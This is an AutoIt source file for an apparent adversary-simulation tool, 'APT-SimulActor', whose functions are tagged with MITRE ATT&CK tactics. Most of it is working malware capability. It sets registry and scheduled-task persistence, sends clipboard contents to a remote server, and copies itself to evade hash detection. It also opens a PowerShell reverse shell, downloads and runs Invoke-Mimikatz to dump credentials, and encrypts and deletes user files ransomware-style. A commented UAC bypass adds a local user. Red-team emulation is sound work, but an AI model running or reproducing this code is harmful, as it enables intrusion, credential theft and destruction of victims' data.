;DISCLAIMER: The APT-SimulActor use requires authorization from proper stakeholders. Author and Contributors will not be responsible for the malfunctioning or weaponization of the tool.

#NoTrayIcon

#include <Inet.au3>
#include <MsgBoxConstants.au3>
#include <FileConstants.au3>
#include <WinAPIFiles.au3>
#include <File.au3>
#include <AutoItConstants.au3>
#include <Crypt.au3>

Func init();DESCRIPTION:init;MITRE:-
   If $CmdLine[0] > 0 Then
	  $action = $CmdLine[1]
	  $arg = $CmdLine[2]

	  Dim $szDrive, $szDir, $szFName, $szExt
	  if ($action == "delete_previous") Then
		 if FileExists($arg) Then
			_PathSplit($arg, $szDrive, $szDir, $szFName, $szExt)
			ProcessClose($szFName & $szExt )
			Sleep(2000)
			FileDelete($arg)
		 EndIf
	  EndIf
   EndIf
EndFunc

Func SetPersistent4CurrentUser();DESCRIPTION:Get the exe persistent for current user;MITRE:Persistence
   ;TODO add check if key already there before write
   RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "System", "REG_SZ", @ScriptDir & "\" & @ScriptName)
EndFunc

Func Scheduled();DESCRIPTION:Schedule the sample as a task;MITRE:Persistence
   ;REVIEW: schtasks /query /TN Calculator >NUL 2>&1 || schtasks /create /sc minute /mo 1 /tn Calculator /tr " & @ScriptDir & "\" & @ScriptName
   return function_wrapper("schtasks /create /sc minute /mo 1 /tn Calculator /tr " & @ScriptDir & "\" & @ScriptName)
EndFunc

Func DeleteScheduled($sample);DESCRIPTION:Remove the sample scheduled as a task;MITRE:Persistence
   return function_wrapper("schtasks /delete /TN" & " " & $sample)
EndFunc

Func MessageBox($title, $text);DESCRIPTION:
   MsgBox($MB_SYSTEMMODAL, $title, $text , 10)
EndFunc

Func RunElevated($buffer = 'cd..;cd..;dir;Read-Host -Prompt "Press";');DESCRIPTION:Run powershell command with elevated permissions UAC;MITRE:Execution
   $buffer01 = "powershell.exe -Command ";
   $buffer02 = '"Start-Process powershell -Verb runAs ' & "'";
   $buffer00 = $buffer01 & $buffer02 & $buffer & "'" & '"';
   RunWait($buffer00);
EndFunc

Func RunElevatedNoUAC($buffer = 'cd..;cd..;dir;Read-Host -Prompt "Press";');DESCRIPTION:Run powershell command with elevated permissions WITHOUT UAC;MITRE:Execution
   ;WORK IN Progress;
   ;if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {net user martino testP4ss /add} else {$registryPath = "HKCU:\Environment";$Name = "windir";$Value = "powershell -ep bypass -w h $PSCommandPath;#";Set-ItemProperty -Path $registryPath -Name $name -Value $Value;schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null;Remove-ItemProperty -Path $registryPath -Name $name}
   $buffer01 = "powershell.exe -Command ";
   $buffer02 = '"Start-Process powershell -Verb runAs ' & "'";
   $buffer00 = $buffer01 & $buffer02 & $buffer & "'" & '"';
   RunWait($buffer00);
EndFunc

Func clipboard2Log($timeOut = 10, $pathLog = @TempDir & "\keys.dump");DESCRIPTION:Log to file the data stored in the clipboard;MITRE:Collection
   $buffer=""
   While 1
	  if $timeOut > 0 Then
		 $Data = ClipGet()
		 Sleep(1000)
		 if $buffer <> $Data Then
			$buffer = $Data
			Log2File($buffer, $pathLog)
		 EndIf
		 $timeOut=$timeOut-1
	  Else
		 return True
	  EndIf
   WEnd
EndFunc

Func clipboard2Web($ip, $tag, $port = "80", $timeOut = 10);DESCRIPTION:Log to file the data stored in the clipboard;MITRE:Collection
   $buffer=""
   While 1
	  if $timeOut > 0 Then
		 $Data = ClipGet()
		 Sleep(1000)
		 if $buffer <> $Data Then
			$buffer = $Data
			HttpPost($ip, $tag, $port, $buffer)
		 EndIf
		 $timeOut=$timeOut-1
	  Else
		 return True
	  EndIf
   WEnd
EndFunc

Func Log2File($log, $pathFile);DESCRIPTION:Log to file buffer of data;MITRE:Collection
    ;Local Const $sFilePath = _WinAPI_GetTempFileName(@TempDir)
	Local Const $sFilePath = $pathFile
    Local $hFileOpen = FileOpen($sFilePath, $FO_APPEND)
	   If $hFileOpen = -1 Then
		   MsgBox($MB_SYSTEMMODAL, "", "An error occurred whilst writing the temporary file.")
		   Return False
	   EndIf
    FileWrite($hFileOpen, $log & @CRLF)
    FileClose($hFileOpen)
 EndFunc

Func DetectMouseMoving();DESCRIPTION:Detect if mouse is moving;MITRE:Discovery
   Local $MousePos = MouseGetPos()
   Local $hTimer = TimerInit()
   while 1
	  If $MousePos[0] <> MouseGetPos()[0] Then
		 Return 1
	  EndIf
	  if TimerDiff($hTimer) > 5000 Then
		  MsgBox($MB_SYSTEMMODAL, "", ":(")
		 Exit
	  EndIf
   WEnd
EndFunc

Func RandomString();DESCRIPTION:random string generator;MITRE:-
   $out = ""
   Dim $buffer[3]
   $digits = 8
   For $i = 1 To $digits
	   $buffer[0] = Chr(Random(65, 90, 1)) ;A-Z
	   $buffer[1] = Chr(Random(97, 122, 1)) ;a-z
	   $buffer[2] = Chr(Random(48, 57, 1)) ;0-9
	   $out &= $buffer[Random(0, 2, 1)]
   Next
   Return $out & ".exe"
EndFunc

Func CopyTempRun($newName = RandomString());DESCRIPTION:copy myself into temp changing hash;MITRE:Defence Evasion
   FileCopy(@ScriptDir & "\" & @ScriptName, @TempDir & "\" & $newName, $FC_OVERWRITE + $FC_CREATEPATH)
   Local $hFileOpen = FileOpen(@TempDir & "\" & $newName, $FO_APPEND)
   If $hFileOpen = -1 Then
	  Return False
   EndIf
   FileWriteLine($hFileOpen, "1")
   FileClose($hFileOpen)
   RunWait(@TempDir & "\" & $newName & " " & "delete_previous" & " " & @ScriptDir & "\" & @ScriptName);
EndFunc

Func isRunningFromTemp();DESCRIPTION:Check if sample is running from Temp folder;MITRE:Discovery
   if (@ScriptDir & "\" & @ScriptName == @TempDir & "\" & @ScriptName) Then
	  Return 1
   EndIf
EndFunc

Func Move2Temp($newName = RandomString());DESCRIPTION:if it's not running from temp, drop child to temp with different hash;MITRE:Defence Evasion
   if isRunningFromTemp() Then
	  Return 1
   Else
	  CopyTempRun($newName)
	  Exit
   EndIf
EndFunc

Func administrators();DESCRIPTION:enumerated administrative users;MITRE:Discovery
   return function_wrapper("net localgroup administrators")
EndFunc

Func systeminfo();DESCRIPTION:get sys info;MITRE:Discovery
   return function_wrapper("systeminfo")
EndFunc

Func updates_installed();DESCRIPTION:list of all installed Windows and software updates applied to that computer;MITRE:Discovery
   return function_wrapper("wmic qfe list full")
EndFunc

Func shared();DESCRIPTION:get a list of shared resources;MITRE:Discovery
   Return function_wrapper("wmic share get")
EndFunc

Func searchPasswordsOnRegistry();DESCRIPTION:search for password in registry;MITRE:Credential Access
   Return function_wrapper("reg query HKCU /f password /t REG_SZ /s")
EndFunc

Func whoami();DESCRIPTION:who am I?;MITRE:Discovery
   $sReturn = function_wrapper("whoami")
   Return StringSplit(StringRegExpReplace(StringUpper($sReturn), '\n|\r', ''),"\")[2];
EndFunc

Func AmIusername($username);DESCRIPTION:Am I username?;MITRE:Discovery
   $sReturn = function_wrapper("whoami")
   $current_user = StringSplit(StringRegExpReplace(StringUpper($sReturn), '\n|\r', ''),"\")[2];
   if StringLower($current_user) == StringLower($username) Then
	  Return 1
   Else
	  Return 0
   EndIf
EndFunc

Func numberOfLogins($user);DESCRIPTION:get number of logins for specific user;MITRE:Defence Evasion
   return StringReplace(StringSplit(function_wrapper("wmic netlogin where (name like '%" & $user & "') get numberoflogons"), @CRLF)[4], " ", "")
EndFunc

Func nslookup($address);DESCRIPTION:run nslookup;MITRE:Discovery
   $sReturn = function_wrapper("nslookup " & $address)
   if StringInStr($sReturn, "NON-EXISTENT") Then
	  return 0
   Else
	  return $sReturn
   EndIf
EndFunc

Func function_wrapper($command);DESCRIPTION:internal function;MITRE:-
   Local $sOutput = ""
   Local $hPid = Run($command, '', @SW_HIDE, $STDERR_MERGED)
   Do
	   Sleep(100)
	   $sOutput &= StdoutRead($hPid)
   Until @error
   ;$sOutput = StringStripWS($sOutput, $STR_STRIPALL) ; remove all @cr and spaces from output
   Return $sOutput
EndFunc

Func HttpDownloadFile($sURL, $FileName = @TempDir & "\drop.tmp");DESCRIPTION:download a file from an http server;MITRE:Command And Control
   InetGet($sURL, $FileName, 1, 1)
EndFunc

Func PopUp();DESCRIPTION:PopUp using powershell;MITRE:-
   $buffer = "[Reflection.Assembly]::LoadWithPartialName('''System.Windows.Forms''');[Windows.Forms.MessageBox]::show('''Hello World''', '''My PopUp Message Box''')"
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nop -exec bypass -c " & " " & $buffer);
EndFunc

Func ReverseShell($RemoteIp, $RemotePort);DESCRIPTION:reverse shell using powershell;MITRE:Execution
   $buffer = "$client = [System.Net.Sockets.TCPClient]::new('" & $RemoteIp & "'," & $RemotePort & ");[byte[]]$bytes = (0..65535).ForEach{ 0 };$stream = $client.GetStream();while ($i = $stream.Read($bytes, 0, $bytes.Length)) {$data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i);$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);$prompt = $sendback + 'PS ' + $PWD.Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($prompt);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close()"
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nop -exec bypass -c " & " " & $buffer);
EndFunc

Func Mimikatz();DESCRIPTION:Mimikatz;MITRE:Credential Access
   $buffer = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds";
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nop -exec bypass -c " & " " & $buffer);
EndFunc

Func InternetCheck();DESCRIPTION:check if internet is up;MITRE:Discovery
    Local $iPing = Ping("wikipedia.org", 250)
    If $iPing Then
        return 1
    Else
        return 0
    EndIf
 EndFunc

Func ReadRemoteVar($url);DESCRIPTION:read remote http/s page;MITRE:Command and Control
   return _INetGetSource($url) & @crlf
EndFunc

Func TCPscanner($ip,$port);DESCRIPTION:TCP scanner;MITRE:Discovery
   TCPStartup()
   $result = TCPConnect($ip,$port)
   Sleep(1)
   TCPShutdown()
   if $result > 0 Then
	  Return "open"
   Else
	  Return "closed"
   EndIf
EndFunc

Func HttpPost($ip, $tag, $port = "80", $sData = "");DESCRIPTION:Send data over Http;MITRE:Command and Control
	if TCPscanner($ip, $port) == "open" Then
	  Local $oHTTP = ObjCreate("WinHttp.WinHttpRequest.5.1")
	  $oHTTP.Open("POST", "http://" & $ip & ":" & $port, False)
	  If (@error) Then Return 0
	  $oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
	  $oHTTP.Send($tag & "=" & $sData)
	  If (@error) Then Return 0
	  If ($oHTTP.Status <> 200) Then Return SetError(3, 0, 0)
	  Return SetError(0, 0, $oHTTP.ResponseText)
   Else
	  Return 0
   EndIf
EndFunc

Func EncryptFiles($password,$folder);DESCRIPTION:Encrypt the files in a directory;MITRE:Post-Adversary Device Access
  ; List all the files in the directory
	$filePath = _PathFull($folder,@UserProfileDir)
    Local $files = _FileListToArray($filePath, "*")
	For $i = 1 To $files[0]
	   $result = _Crypt_EncryptFile($filePath & "/" & $files[$i],$filePath & "/" & $files[$i] & ".crypt", $password, $CALG_AES_256)
	   if $result Then
		 FileDelete($filePath & "/" & $files[$i])
	   EndIf
    Next
EndFunc

Func DecryptFiles($password,$folder);DESCRIPTION:Decrypt the files in a directory;MITRE:-
  ; List all the files in the directory
	$filePath = _PathFull($folder,@UserProfileDir)
    Local $files = _FileListToArray($filePath, "*")
	For $i = 1 To $files[0]
	   $result = _Crypt_DecryptFile($filePath & "/" & $files[$i],$filePath & "/" & stringtrimright($files[$i], 6 ), $password, $CALG_AES_256)
 	   if $result Then
		 FileDelete($filePath & "/" & $files[$i])
	   EndIf
    Next
 EndFunc

Func ListDesktopFiles();DESCRIPTION:get list of the files in the Desktop;MITRE:Discovery
   local $buffer = ""
   $FileList =_FileListToArray(@DesktopDir)
	  For $i = 1 To $FileList[0]
		 $buffer =  $buffer &  @CRLF & $FileList[$i]
	  Next
   Return $buffer
EndFunc

Func ReadFile($sFilePath);DESCRIPTION:open a file and get content to a variable;MITRE:Discovery
    Local $hFileOpen = FileOpen($sFilePath, $FO_READ)
    If $hFileOpen = -1 Then
        Return False
    EndIf
    Local $sFileRead = FileRead($hFileOpen)
    FileClose($hFileOpen)
	Return $sFileRead
EndFunc

Func Unzip($source,$destination);DESCRIPTION:unzip;MITRE:-
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Expand-Archive -Force" & " " & $source & " " & $destination)
EndFunc
